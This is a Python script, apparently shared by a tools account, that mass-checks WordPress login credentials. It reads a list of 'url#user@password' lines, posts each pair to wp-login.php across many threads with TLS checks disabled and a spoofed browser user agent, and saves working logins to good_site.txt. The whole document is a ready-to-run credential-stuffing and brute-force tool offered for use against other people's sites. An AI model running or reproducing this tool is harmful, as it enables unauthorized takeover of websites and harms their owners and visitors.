# If it's free, just use it :)
# i love you fiola ♡
# follow @fiolatools for more tools
 
import requests, json, os
from multiprocessing.dummy import Pool
from colorama import Fore, init
from bs4 import BeautifulSoup as soap
requests.packages.urllib3.disable_warnings()
init()

red = Fore.RED
green = Fore.GREEN
reset = Fore.RESET
yellow = Fore.YELLOW

banner = f"""
-> {yellow}Wp-Login Brute Checker By @GrazzMean. | fooster1337{reset}
-> {red}Important!. Use Format : http://site.com/wp-login.php#admin@admin{reset}
-> {green}otherwise the program will error{reset}
"""


def login(target):
    try:
        # remove # and @ and split into ['http://site.com/wp-login.php', 'username', 'pwd']
        format = target.replace('#', ' ').replace('@', ' ').split()
        # separates the list that has been split into 3 variables containing url, user, password
        url, user, pwd = format[0], format[1], format[2]
        # user-agent for requests
        headers = {
            'User-Agent':'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.66 Safari/537.36 RuxitSynthetic/1.0 v3652647187556729212 t6142409407075435073 ath259cea6f altpriv cvcv=2 smf=0'
        }
        
        # get cookies from websites so they don't get blocked
        cook = requests.Session(); cooki = cook.get(url, allow_redirects=False); cookies = dict(cooki.cookies)
        # remove 'wp-login.php' for payload
        url_dash = url.replace('/wp-login.php', '')
        payload = {'log': f'{user}', 'pwd': f'{pwd}', 'wp-submit': 'Log+In', 'redirect_to': f'{url_dash}/wp-admin/', 'testcookie': '1'}
        # requests into website
        #nino = requests.Session()
        req = requests.post(url, data=payload, headers=headers, allow_redirects=True, cookies=cookies, verify=False).content.decode('utf8')
        # condition whether the login was successful or not
        if 'dashboard' in req or 'Howdy, ' in req or '/wp-admin/admin-ajax.php' in req:
            print(f'[{yellow}#{reset}] {target} => [{green}Success Login{reset}]')
            open('good_site.txt', 'a+', encoding="utf8").write(target+'\n')
        else: print(f'[{yellow}#{reset}] {target} => [{red}Error!{reset}]'); open('bad_site.txt', 'a+', encoding="utf8").write(target+'\n'); pass
    
    # for handle all error
    except req.exceptions.Timeout: print(f"print(f'[{yellow}#{reset}] {target} => [{red}Timeout{reset}]')"); pass
    except Exception as e: pass

def main():
    try:
        if os.name == "nt": os.system('cls')
        elif os.name == "posix": os.system('clear')
        else: pass
        print(banner)
    # read file and remove duplicate from list
        file = list(dict.fromkeys(open(input("- Wp-Login Brute List : ")).read().splitlines()))
    # input thread
        thread = int(input("- Thread : "))
    # using multiprocessing to create pool
        pool = Pool(thread)
        pool.map(login, file)
        pool.close(); pool.join()
        
    except Exception as e: print(e); exit()

if __name__ == "__main__":
    main()
